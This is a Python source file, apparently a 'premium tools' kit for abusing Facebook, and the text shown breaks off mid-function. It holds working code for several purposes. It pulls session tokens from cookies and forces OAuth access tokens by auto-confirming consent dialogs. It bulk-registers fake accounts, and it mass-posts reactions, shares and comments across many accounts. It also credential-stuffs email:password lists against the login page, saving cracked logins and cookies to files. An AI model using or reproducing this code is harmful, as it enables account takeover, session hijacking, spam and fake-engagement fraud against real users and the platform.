#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║          VERN PREMIUM TOOLS v7 — LARA APK EDITION               ║
║   Spam Share │ AU2 │ FB Clone │ Mass Comment │ Auto React       ║
║   [+] Lara APK reaction engine  [+] access_token extractor      ║
╚══════════════════════════════════════════════════════════════════╝
"""
import os, sys, re, time, json, base64, random, string, threading
import http.server, socketserver, urllib.parse, socket, hashlib, struct

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    os.system("pip install requests -q")
    import requests

# ── BANNER ────────────────────────────────────────────────────────────────────
BANNER = r"""
[95m╔══════════════════════════════════════════════════════════════════╗
║  [96m ___  ___  ___ ___  [93m___  ___  ___ [95m___  ___     [96m_  _ ____  [95m║
║  [96m| |  |___|| |_|_  | [93m| |  |   | | _[95m|___)| |_|[96m   | \/ ||___| [95m║
║  [96m|_|_ |_|  |_| _|_|_|[93m|_|  |_|_|_|_|[95m|  \_|_| |[96m   |    ||___| [95m║
║       [93m★ LARA APK EDITION v7 ★ COOKIE-BASED FACEBOOK TOOLS ★    [95m║
╚══════════════════════════════════════════════════════════════════╝[0m
[90m  [1] Spam Share      [2] Auto Create (AU2)    [3] FB Clone (Crack)
  [4] Mass Comment    [5] Auto Reaction (LARA)  [6] Web Interface
  [7] Extract Token   [8] Exit[0m
"""

COLOR = {
    'r': '\033[91m', 'g': '\033[92m', 'y': '\033[93m',
    'b': '\033[94m', 'm': '\033[95m', 'c': '\033[96m',
    'w': '\033[97m', 'x': '\033[0m', 'dim': '\033[90m'
}
def c(col, txt): return COLOR.get(col,'') + str(txt) + COLOR['x']

def clear(): os.system("clear" if os.name != 'nt' else "cls")

def banner():
    clear()
    print(BANNER)

def log_ok(msg):  print(c('g', '[+] ') + str(msg))
def log_er(msg):  print(c('r', '[-] ') + str(msg))
def log_in(msg):  print(c('c', '[*] ') + str(msg))
def log_w(msg):   print(c('y', '[!] ') + str(msg))

# ── COOKIE PARSER ─────────────────────────────────────────────────────────────
def parse_cookie(raw):
    """Parse raw cookie string into dict, handles ; or | separated."""
    raw = raw.strip()
    ck = {}
    sep = '|' if '|' in raw and ';' not in raw else ';'
    for part in raw.split(sep):
        part = part.strip()
        if '=' in part:
            k, v = part.split('=', 1)
            ck[k.strip()] = v.strip()
    return ck

def cookie_str(ck):
    """Convert cookie dict to string."""
    return '; '.join(f"{k}={v}" for k, v in ck.items())

def get_uid(ck):
    """Get user ID from cookie dict."""
    return ck.get('c_user', ck.get('i_user', ''))

def parse_post_url(url):
    """Extract page_id and post_id from Facebook post URL."""
    url = url.strip()
    # Numeric ID only
    if url.isdigit():
        return None, url
    # Various FB URL patterns
    patterns = [
        r'facebook\.com/(?:groups/[^/]+|[^/]+)/posts/(?:pfbid)?(\d+)',
        r'facebook\.com/permalink\.php\?story_fbid=(\d+)&id=(\d+)',
        r'facebook\.com/(?:photo|video)\.php\?fbid=(\d+)',
        r'facebook\.com/[^/]+/(?:photos|videos)/(?:[^/]+/)?(\d+)',
        r'facebook\.com/(\d+)/posts/(\d+)',
        r'facebook\.com/[^?]+\?.*story_fbid=(\d+)',
    ]
    for pat in patterns:
        m = re.search(pat, url)
        if m:
            groups = m.groups()
            if len(groups) == 2 and all(g and g.isdigit() for g in groups):
                return groups[1], groups[0]  # page_id, post_id
            return None, groups[0]
    # Try to extract any long number from the URL
    nums = re.findall(r'\d{10,}', url)
    if nums:
        return None, nums[-1]
    return None, None

# ── SESSION BUILDERS ──────────────────────────────────────────────────────────
MOBILE_UA = "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
CURL_UA    = "curl/7.68.0"
DALVIK_UA  = "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)"
MBASIC_UA  = "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"

def make_session(ck_dict, ua=MOBILE_UA):
    s = requests.Session()
    s.cookies.update(ck_dict)
    s.headers.update({
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'identity',
    })
    return s

def make_api_session(ck_dict):
    s = requests.Session()
    s.cookies.update(ck_dict)
    s.headers.update({
        'user-agent': MOBILE_UA,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'identity',
        'x-requested-with': 'XMLHttpRequest',
    })
    return s

# ── TOKEN EXTRACTORS ──────────────────────────────────────────────────────────
def extract_fb_tokens(ck_dict):
    """
    Lara APK approach: extract fb_dtsg, lsd, jazoest from mbasic/m.facebook.com
    Returns dict with all tokens found.
    """
    tokens = {'fb_dtsg': None, 'lsd': None, 'jazoest': None, 'uid': get_uid(ck_dict)}
    
    sources = [
        ("https://mbasic.facebook.com/", CURL_UA),
        ("https://m.facebook.com/", MOBILE_UA),
        ("https://www.facebook.com/", MOBILE_UA),
        ("https://mbasic.facebook.com/home.php", CURL_UA),
    ]
    
    for url, ua in sources:
        try:
            s = make_session(ck_dict, ua)
            r = s.get(url, timeout=15)
            html = r.text
            
            # fb_dtsg patterns
            for pat in [
                r'"fb_dtsg_ag"\s*,\s*"([^"]+)"',
                r'name="fb_dtsg"\s+value="([^"]+)"',
                r'"fb_dtsg":{"token":"([^"]+)"',
                r'DTSGInitialData.*?"token":"([^"]+)"',
                r'"token":"([^"]{20,}?)".*?DTSGInitial',
                r'fb_dtsg["\s]+value["\s=]+["\']([^"\']{10,})["\']',
            ]:
                m = re.search(pat, html)
                if m and not tokens['fb_dtsg']:
                    tokens['fb_dtsg'] = m.group(1)
                    break
            
            # lsd
            if not tokens['lsd']:
                m = re.search(r'name="lsd"\s+value="([^"]+)"', html) or \
                    re.search(r'"lsd"\s*,\s*\[\]\s*,\s*\{"token"\s*:\s*"([^"]+)"', html)
                if m: tokens['lsd'] = m.group(1)
            
            # jazoest
            if not tokens['jazoest']:
                m = re.search(r'name="jazoest"\s+value="([^"]+)"', html)
                if m: tokens['jazoest'] = m.group(1)
            
            if tokens['fb_dtsg'] and tokens['lsd']:
                log_ok(f"Tokens extracted from {url}")
                break
        except Exception as e:
            log_er(f"Token extraction from {url}: {e}")
    
    return tokens

def compute_jazoest(dtsg):
    """Compute jazoest from fb_dtsg."""
    total = sum(ord(c) for c in dtsg)
    return str(total + 2)

def extract_access_token(ck_dict):
    """
    Lara APK approach (url.get_token):
    1. Try OAuth dialog flow (non-checkpointed accounts)
    2. Try www.facebook.com for embedded tokens
    3. Try b-api.facebook.com token exchange
    Returns access_token string or None.
    """
    uid = get_uid(ck_dict)
    
    # ── Method 1: OAuth dialog (Lara's url.get_token approach) ──
    APP_IDS = [
        "2343110832341229",  # Lara app / common PH tool
        "136085643099556",   # Facebook Lite
        "804697166318506",   # Mobile browser
        "350685531728",      # Facebook for Android
        "275254692598279",   # FB for Android alt
    ]
    REDIRECT = "https://www.facebook.com/connect/login_success.html"
    SCOPE = "user_friends,email,publish_actions,user_birthday,user_location,user_photos,user_status,user_videos"
    
    for app_id in APP_IDS:
        try:
            s = make_session(ck_dict, MOBILE_UA)
            oauth_url = (
                f"https://m.facebook.com/dialog/oauth"
                f"?client_id={app_id}"
                f"&redirect_uri={urllib.parse.quote(REDIRECT)}"
                f"&scope={urllib.parse.quote(SCOPE)}"
                f"&response_type=token"
                f"&ret=login&fbapp_pres=1"
            )
            r = s.get(oauth_url, timeout=15, allow_redirects=False)
            
            loc = r.headers.get('location', '')
            # Token in redirect fragment
            m = re.search(r'access_token=([A-Za-z0-9_\-\.]{40,})', loc)
            if m:
                log_ok(f"OAuth token found! app_id={app_id}")
                return m.group(1)
            
            # If 200: try to find and submit "Allow" form
            if r.status_code == 200 and len(r.text) > 5000:
                html = r.text
                # Find authorization form
                form_action = re.search(r'action="(/dialog/oauth/confirm[^"]*)"', html)
                if not form_action:
                    form_action = re.search(r'action="(https://m\.facebook\.com/[^"]*oauth[^"]*)"', html)
                
                if form_action:
                    action_url = form_action.group(1)
                    if not action_url.startswith('http'):
                        action_url = "https://m.facebook.com" + action_url.replace('&amp;', '&')
                    
                    # Extract all form fields
                    form_data = {}
                    for inp in re.finditer(r'<input[^>]+>', html, re.I):
                        inp_str = inp.group(0)
                        nm = re.search(r'name=["\']([^"\']+)["\']', inp_str)
                        vl = re.search(r'value=["\']([^"\']*)["\']', inp_str)
                        if nm:
                            form_data[nm.group(1)] = vl.group(1) if vl else ''
                    
                    # Add approval
                    form_data.update({'__CONFIRM__': '1'})
                    
                    r2 = s.post(action_url.replace('&amp;', '&'), data=form_data, 
                               timeout=15, allow_redirects=False)
                    loc2 = r2.headers.get('location', '')
                    m2 = re.search(r'access_token=([A-Za-z0-9_\-\.]{40,})', loc2 + r2.text)
                    if m2:
                        log_ok(f"OAuth confirm token found! app_id={app_id}")
                        return m2.group(1)
        except Exception:
            pass
    
    # ── Method 2: www.facebook.com token scrape ──
    try:
        s = make_session(ck_dict, MOBILE_UA)
        r = s.get("https://www.facebook.com/", timeout=15)
        html = r.text
        
        for pat in [
            r'"access_token"\s*:\s*"(EAA[A-Za-z0-9_\-\.]{30,})"',
            r'"token"\s*:\s*"(EAA[A-Za-z0-9_\-\.]{30,})"',
            r'EAA[A-Za-z0-9]{60,}',
        ]:
            m = re.search(pat, html)
            if m:
                tok = m.group(1) if m.lastindex else m.group(0)
                log_ok(f"EAA access token found in homepage!")
                return tok
    except Exception:
        pass
    
    # ── Method 3: b-api.facebook.com session exchange (Dalvik UA) ──
    BAPI_TOKENS = [
        "237759909591655|0f140aabedfb65ac27a739ed1a2263b0",
        "882a8490361da98702bf97a021ddc14d|0",
    ]
    for btoken in BAPI_TOKENS:
        try:
            s = make_session(ck_dict, DALVIK_UA)
            r = s.get(
                f"https://b-api.facebook.com/method/auth.getSessionforApp"
                f"?access_token={urllib.parse.quote(btoken)}"
                f"&format=json&new_app_id=275254692598279",
                timeout=10
            )
            data = r.json()
            if 'access_token' in data:
                tok = data['access_token']
                if len(tok) > 30:
                    log_ok(f"b-api token exchange success!")
                    return tok
        except Exception:
            pass
    
    log_w("Could not extract access_token — will use cookie-based methods")
    return None

# ── REACTION ENGINE (LARA APK APPROACH) ──────────────────────────────────────
REACTION_TYPES = {
    '1': 'LIKE',
    '2': 'LOVE',
    '3': 'HAHA',
    '4': 'WOW',
    '5': 'SAD',
    '6': 'ANGRY',
    'LIKE': 'LIKE', 'LOVE': 'LOVE', 'HAHA': 'HAHA',
    'WOW': 'WOW',  'SAD': 'SAD',   'ANGRY': 'ANGRY',
}

REACTION_NAMES = {
    'LIKE': 'LIKE 👍', 'LOVE': 'LOVE ❤️', 'HAHA': 'HAHA 😆',
    'WOW': 'WOW 😮',  'SAD': 'SAD 😢',   'ANGRY': 'ANGRY 😡',
}

def react_graph_api(post_id, reaction_type, access_token):
    """
    Lara APK url.submit → graph.facebook.com reaction.
    The exact method used by Lara when access_token is available.
    """
    # Standard Graph API reaction endpoint
    url = f"https://graph.facebook.com/v18.0/{post_id}/reactions"
    params = {
        "type": reaction_type,
        "access_token": access_token,
        "method": "post",
    }
    try:
        r = requests.post(url, params=params, timeout=15)
        data = r.json()
        if data.get('success') or data.get('id'):
            return True, "Graph API reaction OK"
        err = data.get('error', {})
        return False, err.get('message', str(data))
    except Exception as e:
        return False, str(e)

def react_mbasic_form(session, post_id, reaction_type, tokens):
    """
    mbasic form-based reaction (fallback when no access_token).
    Scrapes the mbasic story page and submits the reaction form.
    """
    uid = tokens.get('uid', '')
    
    # Possible story URLs for the post
    story_urls = [
        f"https://mbasic.facebook.com/story.php?story_fbid={post_id}&id={uid}",
        f"https://mbasic.facebook.com/{post_id}",
    ]
    
    html = None
    story_url = None
    for url in story_urls:
        try:
            r = session.get(url, timeout=15)
            if r.status_code == 200 and 'Error' not in r.text[:200]:
                html = r.text
                story_url = url
                break
        except:
            pass
    
    if not html:
        # Try to load post directly from profile
        try:
            r = session.get(f"https://mbasic.facebook.com/", timeout=15)
            html = r.text
            story_url = "https://mbasic.facebook.com/"
        except:
            return False, "Could not load any mbasic page"
    
    # Find reaction form
    reaction_form_m = re.search(
        r'<form[^>]+action="([^"]*(?:ufi/reaction|react)[^"]*)"[^>]*>(.*?)</form>',
        html, re.DOTALL | re.I
    )
    if not reaction_form_m:
        # Search for reaction link
        react_link = re.search(r'href="(/ufi/reaction/[^"]+)"', html)
        if react_link:
            try:
                r2 = session.get("https://mbasic.facebook.com" + react_link.group(1).replace('&amp;', '&'), timeout=15)
                html = r2.text
                reaction_form_m = re.search(
                    r'<form[^>]+action="([^"]*(?:ufi/reaction|react)[^"]*)"[^>]*>(.*?)</form>',
                    html, re.DOTALL | re.I
                )
            except:
                pass
    
    if not reaction_form_m:
        return False, "Reaction form not found in mbasic (account may be checkpointed)"
    
    action = "https://mbasic.facebook.com" + reaction_form_m.group(1).replace('&amp;', '&') \
             if not reaction_form_m.group(1).startswith('http') else reaction_form_m.group(1).replace('&amp;', '&')
    form_body = reaction_form_m.group(2)
    
    # Extract all form fields
    form_data = {}
    for inp in re.finditer(r'<input[^>]+>', form_body, re.I):
        inp_str = inp.group(0)
        nm = re.search(r'name=["\']([^"\']+)["\']', inp_str)
        vl = re.search(r'value=["\']([^"\']*)["\']', inp_str)
        if nm:
            form_data[nm.group(1)] = vl.group(1) if vl else ''
    
    # Inject reaction type
    form_data['reaction_type'] = str({'LIKE':'1','LOVE':'2','HAHA':'3','WOW':'4','SAD':'5','ANGRY':'6'}.get(reaction_type, '1'))
    form_data['target'] = post_id
    
    # Add fb_dtsg if available
    if tokens.get('fb_dtsg') and 'fb_dtsg' not in form_data:
        form_data['fb_dtsg'] = tokens['fb_dtsg']
    if tokens.get('lsd') and 'lsd' not in form_data:
        form_data['lsd'] = tokens['lsd']
    if tokens.get('jazoest') and 'jazoest' not in form_data:
        form_data['jazoest'] = tokens['jazoest']
    
    try:
        r = session.post(action, data=form_data, timeout=15, allow_redirects=True)
        if r.status_code in (200, 302) and 'error' not in r.url.lower():
            return True, "mbasic form reaction submitted"
        return False, f"mbasic POST returned {r.status_code}"
    except Exception as e:
        return False, str(e)

def react_graphql(session, post_id, reaction_type, tokens):
    """
    GraphQL CometUFIFeedbackReactMutation approach.
    Works with fb_dtsg + lsd from non-checkpointed sessions.
    """
    if not tokens.get('fb_dtsg') or not tokens.get('lsd'):
        return False, "No fb_dtsg/lsd tokens"
    
    uid = tokens.get('uid', '')
    dtsg = tokens['fb_dtsg']
    lsd = tokens['lsd']
    jazoest = tokens.get('jazoest') or compute_jazoest(dtsg)
    
    reaction_map = {'LIKE':'1','LOVE':'2','HAHA':'3','WOW':'4','SAD':'5','ANGRY':'6'}
    rt_num = reaction_map.get(reaction_type, '1')
    
    # GraphQL via UFI endpoint
    ufi_url = f"https://www.facebook.com/ufi/reaction/profile/modify/?dpr=1"
    
    data = {
        'ft_ent_identifier': post_id,
        'reaction_type': rt_num,
        'action': 'main',
        'client_mutation_id': ''.join(random.choices(string.digits, k=5)),
        'source': '22',
        'av': uid,
        '__user': uid,
        'fb_dtsg': dtsg,
        'fb_dtsg_ag': dtsg,
        'lsd': lsd,
        'jazoest': jazoest,
        '__a': '1',
        '__req': random.choice(string.ascii_lowercase),
        '__dyn': '7xe6F4a',
        '__csr': '',
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
    }
    
    headers = {
        'x-fb-lsd': lsd,
        'x-requested-with': 'XMLHttpRequest',
        'content-type': 'application/x-www-form-urlencoded',
        'referer': f'https://www.facebook.com/',
        'origin': 'https://www.facebook.com',
    }
    
    try:
        r = session.post(ufi_url, data=data, headers=headers, timeout=15)
        resp = r.text
        if '"error"' not in resp.lower() and r.status_code == 200:
            return True, "GraphQL UFI reaction OK"
        # Try to parse error
        try:
            j = json.loads(resp.lstrip('for(;;);'))
            errors = j.get('errors', [])
            if errors:
                return False, str(errors[0])
        except:
            pass
        return False, f"GraphQL UFI: {r.status_code} {resp[:100]}"
    except Exception as e:
        return False, str(e)

def react_graphql_mutation(session, post_id, reaction_type, tokens):
    """
    Modern GraphQL CometUFIFeedbackReactMutation via /api/graphql/.
    """
    if not tokens.get('fb_dtsg') or not tokens.get('lsd'):
        return False, "No fb_dtsg/lsd tokens"
    
    uid = tokens.get('uid', '')
    dtsg = tokens['fb_dtsg']
    lsd = tokens['lsd']
    jazoest = tokens.get('jazoest') or compute_jazoest(dtsg)
    
    feedback_id = base64.b64encode(f"feedback:{post_id}".encode()).decode()
    
    variables = json.dumps({
        "input": {
            "client_mutation_id": str(random.randint(1,99)),
            "actor_id": uid,
            "feedback_id": feedback_id,
            "feedback_reaction": reaction_type,
            "feedback_source": "OBJECT",
            "is_tracking_encrypted": True,
            "tracking": [],
        }
    })
    
    data = {
        'av': uid,
        '__user': uid,
        '__a': '1',
        'lsd': lsd,
        'jazoest': jazoest,
        'fb_dtsg': dtsg,
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
        'variables': variables,
        'server_timestamps': 'true',
        'doc_id': '2015977348516460',  # CometUFIFeedbackReactMutation
    }
    
    headers = {
        'x-fb-lsd': lsd,
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'referer': 'https://www.facebook.com/',
    }
    
    try:
        r = session.post('https://www.facebook.com/api/graphql/', data=data, headers=headers, timeout=15)
        resp = r.text
        # Success indicators
        if reaction_type.lower() in resp.lower() or '"viewer_feedback_reaction_info"' in resp:
            return True, "GraphQL mutation reaction OK"
        if '"errors"' in resp or 'OAuthException' in resp:
            err_m = re.search(r'"message"\s*:\s*"([^"]+)"', resp)
            return False, err_m.group(1) if err_m else f"GraphQL error: {resp[:100]}"
        if r.status_code == 200:
            return True, "GraphQL mutation submitted (200)"
        return False, f"GraphQL mutation: {r.status_code}"
    except Exception as e:
        return False, str(e)

def do_react(ck_dict, post_id, reaction_type, access_token=None):
    """
    Master reaction function — tries all methods in Lara APK order:
    1. Graph API with access_token (url.submit → graph.facebook.com)
    2. GraphQL mutation (modern web API)
    3. UFI reaction endpoint
    4. mbasic form (last resort)
    """
    rt = REACTION_TYPES.get(str(reaction_type).upper(), 'LIKE')
    session = make_session(ck_dict)
    tokens = extract_fb_tokens(ck_dict)
    
    # Method 1: Graph API (Lara's primary method)
    if access_token:
        ok, msg = react_graph_api(post_id, rt, access_token)
        if ok:
            return True, f"[Graph API] {msg}"
        log_w(f"Graph API failed: {msg}")
    
    # Method 2: GraphQL mutation
    ok, msg = react_graphql_mutation(session, post_id, rt, tokens)
    if ok:
        return True, f"[GraphQL mutation] {msg}"
    log_w(f"GraphQL mutation failed: {msg}")
    
    # Method 3: UFI endpoint
    ok, msg = react_graphql(session, post_id, rt, tokens)
    if ok:
        return True, f"[UFI endpoint] {msg}"
    log_w(f"UFI failed: {msg}")
    
    # Method 4: mbasic form
    mbasic_s = make_session(ck_dict, CURL_UA)
    ok, msg = react_mbasic_form(mbasic_s, post_id, rt, tokens)
    if ok:
        return True, f"[mbasic form] {msg}"
    log_w(f"mbasic form failed: {msg}")
    
    return False, "All reaction methods failed"

# ── AUTO REACTION (MASS / SPEED) ──────────────────────────────────────────────
def mass_auto_reaction(ck_list, post_id, reaction_type, speed=2, access_tokens=None):
    """
    Multi-account auto reaction with speed control.
    Uses Lara APK's cookie + token approach.
    """
    total = len(ck_list)
    ok_count = 0
    fail_count = 0
    
    log_in(f"Starting auto reaction: {total} accounts | reaction={reaction_type} | post={post_id}")
    
    for i, ck in enumerate(ck_list, 1):
        uid = get_uid(ck)
        prefix = f"[{i}/{total}] UID={uid}"
        
        # Get access token for this account if available
        atk = None
        if access_tokens and i <= len(access_tokens):
            atk = access_tokens[i-1]
        
        ok, msg = do_react(ck, post_id, reaction_type, atk)
        
        if ok:
            ok_count += 1
            log_ok(f"{prefix} → {REACTION_NAMES.get(reaction_type,'REACT')} {msg}")
        else:
            fail_count += 1
            log_er(f"{prefix} → FAILED: {msg}")
        
        if i < total:
            time.sleep(speed)
    
    log_in(f"Done: {ok_count} OK | {fail_count} failed | {total} total")
    return ok_count, fail_count

# ── SPAM SHARE ────────────────────────────────────────────────────────────────
def get_share_tokens(session, uid):
    """Extract tokens needed for share action."""
    try:
        r = session.get("https://mbasic.facebook.com/", timeout=15)
        html = r.text
        dtsg = re.search(r'name="fb_dtsg"\s+value="([^"]+)"', html)
        lsd  = re.search(r'name="lsd"\s+value="([^"]+)"', html)
        return dtsg.group(1) if dtsg else None, lsd.group(1) if lsd else None
    except:
        return None, None

def spam_share(ck_dict, post_url, count, speed=3):
    """Share a post N times with speed control."""
    uid  = get_uid(ck_dict)
    _, post_id = parse_post_url(post_url)
    if not post_id:
        log_er("Could not parse post ID")
        return 0
    
    session = make_session(ck_dict, CURL_UA)
    tokens = extract_fb_tokens(ck_dict)
    dtsg = tokens.get('fb_dtsg')
    lsd  = tokens.get('lsd')
    
    if not dtsg:
        log_er("Could not get fb_dtsg for share")
        return 0
    
    log_in(f"Spam Share: post={post_id} | count={count} | uid={uid}")
    ok_count = 0
    
    for i in range(count):
        try:
            data = {
                'fb_dtsg': dtsg,
                'lsd': lsd or '',
                'jazoest': compute_jazoest(dtsg),
                'sid_ts': str(int(time.time())),
                'sid_s': uid,
                '__user': uid,
                '__a': '1',
                'ft_ent_identifier': post_id,
                'composer_session_id': ''.join(random.choices(string.ascii_letters, k=12)),
                'profile_id': uid,
                'target_id': uid,
                'share_type': '2',
                'story_share_type': '2',
                'feed_permalink': post_url,
            }
            headers = {'x-fb-lsd': lsd or '', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://mbasic.facebook.com/'}
            r = session.post('https://mbasic.facebook.com/share/composer/', data=data, headers=headers, timeout=15)
            if r.status_code in (200, 302):
                ok_count += 1
                log_ok(f"[{i+1}/{count}] Share OK")
            else:
                log_er(f"[{i+1}/{count}] Share failed: {r.status_code}")
        except Exception as e:
            log_er(f"[{i+1}/{count}] Share error: {e}")
        
        if i < count - 1:
            time.sleep(speed)
    
    log_in(f"Spam Share done: {ok_count}/{count} OK")
    return ok_count

# ── AUTO CREATE (AU2) ─────────────────────────────────────────────────────────
def auto_create(count, email_prefix=None, speed=5):
    """
    Auto create Facebook accounts (AU2).
    Uses Facebook's registration endpoint.
    """
    names_f = ["Maria","Sofia","Layla","Ana","Camille","Nikki","Bea","Ria","Tina","Ysa",
               "Chloe","Mia","Nina","Lila","Gigi","Mae","Bea","Joy","Jen","Luz"]
    names_m = ["Jose","Marco","Diego","Angelo","Carlo","Luis","Rico","Rex","Vince","Ian",
               "Ken","Dan","Jay","Roy","Ben","Sam","Max","Leo","Nico","Vito"]
    snames  = ["Santos","Cruz","Reyes","Garcia","Torres","Lopez","Gomez","Luna","Dela Cruz","Bautista"]
    
    results = []
    log_in(f"Auto Create: {count} accounts")
    
    for i in range(count):
        gender = random.choice([1, 2])
        fname = random.choice(names_f if gender==2 else names_m)
        lname = random.choice(snames)
        birth_y = random.randint(1990, 2000)
        birth_m = random.randint(1, 12)
        birth_d = random.randint(1, 28)
        pw = ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + "!A1"
        
        if email_prefix:
            email = f"{email_prefix}{random.randint(100,9999)}@gmail.com"
        else:
            email = f"{fname.lower()}{lname.lower()}{random.randint(10,99)}@gmail.com"
        
        try:
            s = requests.Session()
            s.headers.update({'user-agent': MOBILE_UA})
            
            # Get initial tokens
            r = s.get("https://m.facebook.com/r.php", timeout=15)
            html = r.text
            
            lsd_m = re.search(r'name="lsd"\s+value="([^"]+)"', html)
            jazoest_m = re.search(r'name="jazoest"\s+value="([^"]+)"', html)
            
            data = {
                'firstname': fname,
                'lastname': lname,
                'reg_email__': email,
                'reg_email_confirmation__': email,
                'reg_passwd__': pw,
                'birthday_day': str(birth_d),
                'birthday_month': str(birth_m),
                'birthday_year': str(birth_y),
                'sex': str(gender),
                'websubmit': 'Sign Up',
                'lsd': lsd_m.group(1) if lsd_m else '',
                'jazoest': jazoest_m.group(1) if jazoest_m else '',
                'ns': '0',
                'ri': 'signed_out_home',
            }
            
            r2 = s.post("https://m.facebook.com/reg/", data=data, timeout=15)
            
            if 'confirm' in r2.url or 'checkpoint' in r2.url or r2.status_code == 200:
                result = {'email': email, 'password': pw, 'name': f"{fname} {lname}", 'status': 'created'}
                results.append(result)
                log_ok(f"[{i+1}/{count}] Created: {email} | pw: {pw}")
            else:
                log_er(f"[{i+1}/{count}] Failed: {r2.status_code}")
        except Exception as e:
            log_er(f"[{i+1}/{count}] Error: {e}")
        
        if i < count - 1:
            time.sleep(speed)
    
    # Save results
    if results:
        fn = f"/tmp/au2_accounts_{int(time.time())}.txt"
        with open(fn, 'w') as f:
            for acc in results:
                f.write(f"{acc['email']}|{acc['password']}|{acc['name']}\n")
        log_ok(f"Saved {len(results)} accounts to {fn}")
    
    return results

# ── FB CLONE (CRACKING) ───────────────────────────────────────────────────────
def fb_clone_crack(combo_list, speed=1):
    """
    FB clone cracking: test username:password combos.
    Uses Facebook's login endpoint.
    """
    CRACK_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    results = {'hit': [], 'dead': [], 'error': []}
    
    log_in(f"FB Clone: {len(combo_list)} combos")
    
    for i, combo in enumerate(combo_list, 1):
        if ':' not in combo and '|' not in combo:
            continue
        sep = ':' if ':' in combo else '|'
        parts = combo.split(sep, 1)
        if len(parts) != 2:
            continue
        email, pw = parts[0].strip(), parts[1].strip()
        
        try:
            s = requests.Session()
            s.headers.update({'user-agent': CRACK_UA, 'accept-encoding': 'identity'})
            
            # Get login page tokens
            r = s.get("https://mbasic.facebook.com/", timeout=10)
            html = r.text
            lsd = re.search(r'name="lsd"\s+value="([^"]+)"', html)
            jazoest = re.search(r'name="jazoest"\s+value="([^"]+)"', html)
            
            data = {
                'email': email,
                'pass': pw,
                'login': 'Log In',
                'lsd': lsd.group(1) if lsd else '',
                'jazoest': jazoest.group(1) if jazoest else '',
                'm_ts': str(int(time.time())),
                'li': '0',
                'try_number': '0',
                'unrecognized_tries': '0',
                'bi_xrwh': '0',
            }
            
            r2 = s.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=110",
                       data=data, timeout=15, allow_redirects=True)
            
            c_user = s.cookies.get('c_user') or re.search(r'c_user=(\d+)', r2.headers.get('set-cookie',''))
            xs = s.cookies.get('xs')
            
            if c_user and xs:
                uid = c_user if isinstance(c_user, str) else c_user.group(1)
                log_ok(f"[{i}] HIT: {email}:{pw} | UID={uid}")
                results['hit'].append({'email': email, 'password': pw, 'uid': uid,
                                        'cookies': '; '.join(f"{k}={v}" for k,v in s.cookies.items())})
            elif 'checkpoint' in r2.url or 'checkpoint' in r2.text.lower():
                log_w(f"[{i}] CHECKPOINT: {email}:{pw}")
                results['hit'].append({'email': email, 'password': pw, 'uid': '?', 'status': 'checkpoint'})
            elif 'login' in r2.url:
                log_er(f"[{i}] DEAD: {email}:{pw}")
                results['dead'].append(combo)
            else:
                log_w(f"[{i}] UNKNOWN: {email}:{pw} — {r2.status_code}")
        except Exception as e:
            log_er(f"[{i}] ERROR: {combo}: {e}")
            results['error'].append(combo)
        
        if i < len(combo_list):
            time.sleep(speed)
    
    # Save hits
    if results['hit']:
        fn = f"/tmp/fb_hits_{int(time.time())}.txt"
        with open(fn, 'w') as f:
            for hit in results['hit']:
                f.write(f"{hit['email']}:{hit['password']}:{hit.get('uid','?')}\n")
                if 'cookies' in hit:
                    f.write(f"  cookies: {hit['cookies'][:100]}\n")
        log_ok(f"Saved {len(results['hit'])} hits to {fn}")
    
    log_in(f"Done: {len(results['hit'])} hits | {len(results['dead'])} dead | {len(results['error'])} errors")
    return results

# ── MASS AUTO COMMENT ─────────────────────────────────────────────────────────
def post_comment_mbasic(session, post_id, comment, tokens):
    """Post a comment via mbasic form submission."""
    uid = tokens.get('uid', '')
    dtsg = tokens.get('fb_dtsg', '')
    lsd = tokens.get('lsd', '')
    jazoest = tokens.get('jazoest') or (compute_jazoest(dtsg) if dtsg else '')
    
    # Try mbasic comment form
    try:
        r = session.get(f"https://mbasic.facebook.com/{post_id}", timeout=15)
        html = r.text
        
        # Find comment form
        comment_form = re.search(
            r'<form[^>]+action="(/story/mentions/feed/[^"]*)"[^>]*>(.*?)</form>',
            html, re.DOTALL | re.I
        )
        if not comment_form:
            comment_form = re.search(
                r'<form[^>]+action="(/[^"]*comment[^"]*)"[^>]*>(.*?)</form>',
                html, re.DOTALL | re.I
            )
        
        if comment_form:
            action = "https://mbasic.facebook.com" + comment_form.group(1).replace('&amp;', '&')
            form_data = {}
            for inp in re.finditer(r'<input[^>]+>', comment_form.group(2), re.I):
                inp_s = inp.group(0)
                nm = re.search(r'name=["\']([^"\']+)["\']', inp_s)
                vl = re.search(r'value=["\']([^"\']*)["\']', inp_s)
                if nm: form_data[nm.group(1)] = vl.group(1) if vl else ''
            
            form_data.update({'comment_text': comment, 'fb_dtsg': dtsg, 'lsd': lsd, 'jazoest': jazoest})
            
            r2 = session.post(action, data=form_data, timeout=15)
            if r2.status_code in (200, 302):
                return True, "Comment posted (mbasic)"
    except Exception as e:
        pass
    
    # Fallback: GraphQL comment
    try:
        feedback_id = base64.b64encode(f"feedback:{post_id}".encode()).decode()
        variables = json.dumps({"input": {
